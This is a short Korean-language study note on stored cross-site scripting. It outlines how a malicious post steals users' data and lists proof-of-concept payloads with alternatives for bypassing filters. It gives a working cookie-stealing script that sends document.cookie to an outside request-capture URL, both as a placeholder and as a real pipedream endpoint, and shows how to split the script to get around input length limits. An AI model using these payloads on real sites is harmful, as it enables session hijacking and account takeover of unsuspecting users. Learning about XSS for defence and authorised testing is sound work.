# Stored  XSS
## 저장형 XSS(Stored Cross Site Scripting)   
저장형 XSS 공격은 보안이 취약한 서버에 악의적인 사용자가 악성 스크립트를 저장함으로써 발생한다.    
비정상적인 방법이 아니라 서버에서 제공하는 게시판, 사용자 프로필에 악의적으로 동작하는 스크립트가 그대로 저장된 후 클라이언트의 브라우저로 전달되어 문제가 발생한다.   

```
1. 보안이 취약한 사이트에서 제공하는 게시판에 사용자 정보를 빼돌릴 수 있는 스크립트를 작성하여 올린다.

2. 일반 사용자는 악의적인 사용자가 작성한 게시글을 읽으면, 서버로부터 악성 스크립트가 담긴 게시글 응답을 전달받는다.

3. 일반 사용자의 브라우저에서 응답 메세지를 실행하면서 악성 스크립트가 실행된다.

4. 악성 스크립트를 통해 사용자 정보가 악의적인 사용자에게 전달된다.
```
</br>
</br>
</br>

# 방법
POC 코드
```
POC코드로 XSS 공격이 가능한지 확인.


<script>alert()</script>   = POC 코드. 증명용 코드.   

만약 alert를 필터링했다고 하면?    
alert()    
confirm()    
prompt()    
location.herf=''
등등 

굉장히 많음.
```
</br>

cookie를 가져오는 Javascript 코드 예시
```
<script>var i = new Image();i.src = "attack URL?cookie=" + document.cookie </script>
```
</br>

임시 서버 ("attack URL?cookie=")
```
session 탈취를 테스트할 수 있는 공격용 사이트.   
Request Bin   
https://public.requestbin.com/r

https://enideg1fqsaaa.x.pipedream.net 이것은 나의 임시서버.   
위 url로 session 탈취 코드를 넣어서 실행하면 requestbin 사이트에서 나옴.
```
</br>

입력 코드
```
<script>var i = new Image();i.src = "https://enideg1fqsaaa.x.pipedream.net?cookie=" + document.cookie;</script>
```
</br>

만약 길이 제한이 걸렸다면?
```
<script>var i = new Image();</script>
<script>i.src = "attack URL?cookie=" + document.cookie;</script>

나누어서 입력 가능
```

step 1. alert() 를 먼저 띄운다. -> POC코드이기 때문에.   
step 2. 공격 코드를 넣는다. session id    

만약에 안된다? F12 -> Console -> 빨간색 에러가 떠있을 확률이 높음.

